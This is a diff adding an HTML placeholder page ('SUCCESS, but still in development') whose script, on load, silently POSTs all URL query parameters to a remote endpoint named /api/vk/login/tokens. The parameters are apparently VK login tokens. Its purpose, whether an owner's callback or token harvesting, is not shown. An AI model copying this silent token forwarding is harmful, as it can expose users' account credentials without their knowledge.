@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>In Development</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-image: url('wallpaper.webp');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            font-family: Arial, sans-serif;
+            color: white;
+            text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.7);
+        }
+        h1 {
+            font-size: 2rem;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <h2>SUCCESS, but still in development, be patient pls</h2>
+    <script type="application/javascript">
+        const queryParams = new URLSearchParams(window.location.search);
+
+        // Convert query parameters into an object
+        const params = Object.fromEntries(queryParams.entries());
+        // Prepare data for POST request
+        const postData = JSON.stringify(params);
+
+        // Function to send POST request
+        async function sendPostRequest(url, data) {
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: data,
+                });
+
+                if (response.ok) {
+                    const result = await response.json();
+                    console.log('Response:', result);
+                } else {
+                    console.error('Error:', response.status, response.statusText);
+                }
+            } catch (error) {
+                console.error('Request failed:', error);
+            }
+        }
+
+        // Send POST request to the target API endpoint
+        sendPostRequest('https://iktomi.pro/api/vk/login/tokens', postData);
+    </script>
+</body>
+</html>
